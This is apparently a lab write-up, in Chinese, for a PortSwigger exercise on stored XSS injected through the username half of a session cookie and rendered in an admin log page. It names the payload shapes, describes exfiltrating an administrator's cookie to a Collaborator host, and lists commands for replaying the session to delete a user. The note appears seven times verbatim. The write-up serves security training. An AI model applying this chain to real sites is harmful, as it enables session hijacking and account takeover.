---
title: lab-scanning-non-standard-data-structures
---

# lab-scanning-non-standard-data-structures

> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。

## 机制:日志型存储 XSS(不是反射型)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。

## 会话语义(逐字节刚性)

`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。

- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。

## 实例寿命坑

lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。

## 复现命令

`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`

## 关系

族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。

# lab-scanning-non-standard-data-structures

> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。

## 机制:日志型存储 XSS(不是反射型)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。

## 会话语义(逐字节刚性)

`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。

- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。

## 实例寿命坑

lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。

## 复现命令

`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`

## 关系

族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。

# lab-scanning-non-standard-data-structures

> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。

## 机制:日志型存储 XSS(不是反射型)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。

## 会话语义(逐字节刚性)

`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。

- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。

## 实例寿命坑

lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。

## 复现命令

`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`

## 关系

族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。

# lab-scanning-non-standard-data-structures

> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。

## 机制:日志型存储 XSS(不是反射型)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。

## 会话语义(逐字节刚性)

`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。

- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。

## 实例寿命坑

lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。

## 复现命令

`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`

## 关系

族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。

# lab-scanning-non-standard-data-structures

> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。

## 机制:日志型存储 XSS(不是反射型)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。

## 会话语义(逐字节刚性)

`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。

- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。

## 实例寿命坑

lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。

## 复现命令

`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`

## 关系

族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。

# lab-scanning-non-standard-data-structures

> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。

## 机制:日志型存储 XSS(不是反射型)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。

## 会话语义(逐字节刚性)

`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。

- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。

## 实例寿命坑

lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。

## 复现命令

`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`

## 关系

族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。

# lab-scanning-non-standard-data-structures

> evidences: [[web-vuln-methods]] 题面:漏洞藏在"非标准数据结构"里(需 Burp「Scan selected insertion point」),手动利用后删 carlos;wiener:peter。判定:**solved**(日志型存储 XSS 全链实证)。

## 机制:日志型存储 XSS(不是反射型)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32 位 base62 token>` 的 **username 半**。链路三段,每段都有实证。 **注入即入账**:`GET /my-account?id=wiener` 携带 `session=<PAYLOAD>%3a<原 sid>`,app 的完整性校验失败后把 **URL 解码后的 username 半原样写进请求日志**(`Integrity violation detected from <PAYLOAD>`)。响应仍是 **500、2480B、digest 与载荷无关恒为 `aa136edf6af38e3e`**。 **sink 在管理员日志面**:`/admin/logs` 把每条日志**未转义**渲染进 `<div>` ⇒ 存储 XSS。实测该页含四条完整载荷(`<script>fetch(...)`、`<script>import(...)`、`<img src=x onerror=fetch(...)>`、`<svg onload=fetch(...)>`)。 **交付靠模拟受害者**:约 60-90s 后受害者浏览器(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)访问日志面执行载荷,`document.cookie` 外带到 Collaborator(URL path = `session=administrator%3a<token>; secret=…`)。重放该会话 → `/admin` 200 → `GET /admin/delete?username=carlos`(GET,**无 csrf**)→ 横幅翻牌。 **核心教训:本题"注入成功"以服务端日志为判据,不以响应为判据。** 响应恒 500 且 digest 与载荷无关,恰好是入账的表现;把它读成"注入被挡"是错判。同族排查序:响应无差分 → 先找 `logs` / `audit` / `admin` 类只读面,再谈死路。

## 会话语义(逐字节刚性)

`cookie = <username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username。

- username 匹配且 token 有效 → 200(wiener 访问 `/admin` 仍 401)。 - username 不匹配而 token 有效 → **500 `Integrity violation detected`**(且入日志)。 - username 任意而 token 未知/空/无冒号 → 302 `/login`,**不创建会话**。 - `?id=` 不等于会话 username → 302 `/login`;重复 id 参数取**最后一个**。 **无 canonical-form 窗口**:大小写、前导/尾随空格与 `%20`/`+`/`%09`/`%0b`、`%00`、`wiener--`、token 截尾/大写、重复 cookie(后者胜)、重复 Host(400 duplicate)、参数污染、未知 token + 特权 username、login 表单 username(严格查库)全部不改语义。 非 cookie 面同批证伪:comment body/name/website 与 `?search=` 全部 HTML 转义;`POST /my-account/change-email` 只存不判。**唯一可利用面就是 cookie 半 → 日志 → 日志页**。

## 实例寿命坑

lazy 容器内存会话会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie。复用实例上先复验会话,再谈归因。

## 复现命令

`range_launch launch-url <lab-page-url> --jar /tmp/cj1.json http_session get  <inst>/login --jar j http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j raw_matrix @deliver.json                   # Cookie: session=<PAYLOAD>%3a<sid>;500 即投递成功 nap 90 ; burp_collab poll                  # 取 administrator%3a<token> http_dump <inst>/admin --jar admin-jar http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 末跳被轮换成匿名,横幅才是判据 http_dump <inst>/admin/logs --jar admin-jar # 回看日志即注入留痕(自证) banner_verdict <inst> --out <run>/verdict.json`

## 关系

族 [[web-vuln-methods]];姊妹题 [[lab-discovering-vulnerabilities-quickly-with-targeted-scanning]];应用形状 [[portswigger-burp-scanner-essential-skills-labs-app-shapes-and-traps]]。
